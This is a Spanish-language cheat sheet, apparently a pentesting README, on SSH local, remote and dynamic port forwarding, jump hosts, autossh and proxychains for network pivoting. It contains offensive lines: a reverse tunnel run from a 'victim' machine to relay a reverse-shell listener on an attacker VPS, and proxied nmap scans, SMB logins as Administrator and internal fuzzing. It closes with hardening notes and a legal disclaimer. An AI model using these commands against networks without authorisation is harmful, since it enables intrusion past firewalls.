<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Túneles SSH y Proxychains: hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```
<p align="centro">
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="Túnel SSH">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivotante">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<p align="centro">
  <b>🚇 Referencia completa para túneles SSH locales (-L), remotos/inversos (-R) y dinámicos SOCKS (-D) con integración de Proxychains-ng</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y arquitecturas de túneles] (#-descripción general--arquitecturas-de-túneles)
- [Reenvío de puerto local (`-L`)](#-reenvío-de-puerto-local--l)
  - [Sintaxis y mecánica](#sintaxis--mecánica)
  - [Reenviar una interfaz web interna](#reenviar-una-interfaz-web-interna)
  - [Reenvío de puertos de bases de datos remotas](#reenvío-puertos-de-bases-de-datos-remotos)
- [Reenvío de puerto remoto/inverso (`-R`)](#-remoto--reenvío-de-puerto-inverso--r)
  - [Sintaxis y mecánica](#syntax--mechanics-1)
  - [Exponer el controlador de shell inverso local](#exponer-local-reverse-shell-handler)
  - [Retransmisión de tráfico entrante desde DMZ](#retransmisión-tráfico-entrante-desde-dmz)
- [Reenvío dinámico de SOCKS (`-D`)](#-reenvío-dinámico-de-calcetines--d)
  - [Sintaxis y configuración de SOCKS5] (#sintaxis--socks5-setup)
- [Configuración de Proxychains-ng](#-proxychains-ng-configuración)
  - [Configurando `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
  - [Enrutamiento de herramientas CLI a través de Proxychains] (#enrutamiento-cli-tools-through-proxychains)
- [Hosts de salto y pivotación de múltiples saltos (`-J`)](#-pivotación de múltiples saltos--hosts-de salto--j)
- [Túneles persistentes con Autossh](#-túneles-persistentes-con-autossh)
- [Secuencias de escape SSH interactivas (`~C`)](#-interactive-ssh-escape-sequences-c)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y OPSEC](#-consideraciones-defensivas--opsec)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y arquitecturas de túneles

SSH no es simplemente un cliente de terminal remoto; Es una capa de transporte de flujo de bytes bidireccional y cifrada que elude las políticas restrictivas de firewall de entrada/salida:

1. **Reenvío de puerto local (`-L`):** Abre un puerto de escucha en la **máquina local del atacante**; las conexiones se canalizan a través de SSH y se reenvían a un destino accesible desde el servidor SSH remoto.
2. **Reenvío de puerto remoto (`-R`):** Abre un puerto de escucha en el **servidor SSH remoto**; Las conexiones entrantes se canalizan de regreso a la máquina local del atacante o al objetivo interno.
3. **Reenvío dinámico de puertos (`-D`):** Convierte el cliente SSH en un **proxy SOCKS4/SOCKS5** local, lo que permite que las herramientas (Nmap, Burp Suite, Ffuf, Metasploit) enruten tráfico TCP arbitrario a través de la red remota.
```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```
---

## 🔌 Reenvío de puerto local (`-L`)

### Sintaxis y mecánica
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```
### Reenvío de una interfaz web interna
Accede a un panel de administración web en `172.16.0.15:80` a través del pivote `10.10.10.200`:
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*Ahora busque `http://127.0.0.1:8080` en su navegador local.*

### Reenvío de puertos de bases de datos remotas
Acceda a una base de datos interna PostgreSQL vinculada únicamente a `127.0.0.1:5432` en el servidor remoto:
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```
> [!NOTA]
> Banderas utilizadas:
> - `-N`: No ejecute un comando de shell remoto (solo túnel).
> - `-f`: se ejecuta en segundo plano inmediatamente antes de la ejecución del comando.

---

## 🔄 Reenvío de puertos remoto/inverso (`-R`)

### Sintaxis y mecánica
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```
### Exponer el controlador de shell inverso local
Desde una máquina de destino comprometida detrás de NAT, atraviese los firewalls salientes para enviar tráfico a su oyente externo en VPS:
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```
### Retransmisión de tráfico entrante desde DMZ
Reenvíe el puerto 8080 en el pivote remoto al puerto local 80:
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```
> [!IMPORTANTE]
> Para vincular puertos remotos a todas las interfaces (`0.0.0.0`), el `/etc/ssh/sshd_config` del servidor SSH debe configurar:
> `GatewayPorts yes` o `GatewayPorts clientspecified`.

---

## 🌐 Reenvío dinámico de SOCKS (`-D`)

### Sintaxis y configuración de SOCKS5
Cree un proxy SOCKS5 dinámico en el puerto local `1080`:
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```
Verifique que el proxy SOCKS esté escuchando:
```bash
ss -tlpn | grep 1080
```
---

## ⚙️ Configuración de Proxychains-ng

Proxychains intercepta llamadas de red de bibliotecas dinámicas (`connect()`, `gethostbyname()`) a través de `LD_PRELOAD` para forzar aplicaciones CLI estándar a través de proxies SOCKS/HTTP.

### Configurando `/etc/proxychains4.conf`
Edite el archivo de configuración para que apunte a su túnel SSH Dynamic SOCKS:
```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```
### Enrutamiento de herramientas CLI a través de Proxychains
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
---

## 🔀 Anfitriones de salto y pivote de múltiples saltos (`-J`)

Al atravesar múltiples límites de firewall segmentados:
```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```
---

## 🔁 Túneles persistentes con Autossh

Cuando los túneles SSH caen debido al tiempo de espera de la red o caídas de NAT, `autossh` monitorea y reinicia automáticamente la conexión SSH:
```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```
---

## ⌨️ Secuencias interactivas de escape SSH (`~C`)

Si ya tiene una sesión SSH interactiva abierta y de repente necesita abrir un puerto sin desconectarse:

1. Presione `Enter`
2. Escriba `~C` (Tilde seguida de C mayúscula)
3. El mensaje cambia a `ssh> `.
4. Agregue sus reglas de reenvío sobre la marcha:
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
O crea CALCETINES dinámicos:
   ```text
   ssh> -D 1080
   ```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Reenvío de puerto local** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **Reenvío de puerto remoto** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| **Proxy dinámico SOCKS5**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **Túnel silencioso de fondo** | `ssh -f -N -D 1080 user@pivot` |
| **Saltar pivote del host** | `ssh -J user@hop1,user@hop2 target` |
| **Ejecutar herramienta a través de Proxychains** | `proxychains4 <TOOL> <ARGS>` |
| **Reconexión automática persistente** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **Túnel sobre la marcha** | `Enter` luego `~C` -> `ssh> -D 1080` |

---

## 🛡️ Consideraciones defensivas y OPSEC

1. **Deshabilite el reenvío de puertos en SSHD:** Configure `AllowTcpForwarding no` y `PermitTunnel no` en `/etc/ssh/sshd_config` en sistemas de producción reforzados.
2. **Detección de anomalías en el flujo de red:** Las sesiones SSH persistentes de larga duración que transfieren importantes flujos de bytes bidireccionales a menudo indican túneles interactivos o exfiltración de datos.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> La tunelización SSH y la pivotación de red solo deben realizarse en redes y sistemas donde se haya obtenido autorización explícita por escrito. Eludir sin autorización los cortafuegos de la red perimetral es ilegal.